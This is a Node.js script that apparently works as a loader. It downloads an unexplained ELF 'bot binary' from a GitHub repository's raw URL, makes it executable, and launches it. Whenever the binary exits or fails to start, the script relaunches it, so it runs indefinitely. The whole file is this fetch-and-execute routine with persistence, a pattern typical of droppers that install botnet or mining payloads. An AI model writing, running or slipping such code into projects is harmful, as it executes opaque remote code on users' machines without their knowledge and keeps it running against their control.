const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const OWNER = 'malasahjagotwin';
const REPO = 'cgo';
const BASES = [
  `https://raw.githubusercontent.com/${OWNER}/${REPO}/main`,
  `https://github.com/${OWNER}/${REPO}/raw/refs/heads/main`,
];

function request(url, redirects) {
  return new Promise((resolve, reject) => {
    const mod = url.startsWith('https:') ? https : http;
    const req = mod.get(url, { headers: { 'User-Agent': 'node' } }, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location && redirects < 5) {
        res.resume();
        resolve(request(new URL(res.headers.location, url).toString(), redirects + 1));
        return;
      }
      if (res.statusCode !== 200) {
        res.resume();
        resolve({ status: res.statusCode, buffer: null });
        return;
      }
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: 200, buffer: Buffer.concat(chunks) }));
    });
    req.on('error', reject);
    req.setTimeout(20000, () => req.destroy(new Error('timeout')));
  });
}

async function download(rel, dest) {
  for (const base of BASES) {
    try {
      const { status, buffer } = await request(`${base}/${rel}?cb=${Date.now()}`, 0);
      if (status === 200 && buffer && buffer.length > 0) {
        if (buffer.length < 4 || buffer[0] !== 0x7f || buffer[1] !== 0x45 || buffer[2] !== 0x4c || buffer[3] !== 0x46) {
          console.log(`bad binary for ${rel}: not an ELF file, first bytes ${buffer.slice(0, 8).toString('hex')}`);
          continue;
        }
        const machine = buffer.readUInt16LE(18);
        if (machine !== 62) {
          console.log(`bad binary for ${rel}: machine ${machine} (expected 62 = x86_64, node arch=${process.arch})`);
          continue;
        }
        await fs.promises.mkdir(path.dirname(dest), { recursive: true });
        await fs.promises.writeFile(dest, buffer);
        await fs.promises.chmod(dest, 0o755);
        console.log(`downloaded ${rel} (${buffer.length} bytes)`);
        return true;
      }
    } catch {}
  }
  return false;
}

async function fetchBot() {
  const dest = path.join(__dirname, 'c');
  let ok = false;
  for (let attempt = 0; attempt < 3 && !ok; attempt++) {
    ok = await download('abots/c/c', dest);
    if (!ok) {
      await new Promise((r) => setTimeout(r, 2000 * (attempt + 1)));
    }
  }
  console.log(`${ok ? 'downloaded' : 'failed to download'} bot binary`);
  return ok;
}

async function main() {
  console.log('bots setup: fetching bot binary from GitHub');
  if (!(await fetchBot())) {
    console.error('setup failed, exiting');
    process.exit(1);
  }
  console.log('starting bot heartbeat');
  const botPath = path.join(__dirname, 'c');
  const bot = spawn(botPath, [], {
    stdio: 'inherit',
    cwd: __dirname,
  });
  bot.on('exit', (code) => {
    console.log(`bot exited with code ${code}, restarting`);
    setTimeout(main, 2000);
  });
  bot.on('error', (err) => {
    try {
      const st = fs.statSync(botPath);
      const exe = (st.mode & 0o111) !== 0;
      console.error(`spawn failed: ${err.message} (file exists=${st.isFile()}, executable=${exe}, size=${st.size})`);
    } catch (e) {
      console.error(`spawn failed: ${err.message} (stat error: ${e.code})`);
    }
    setTimeout(main, 2000);
  });
}

main();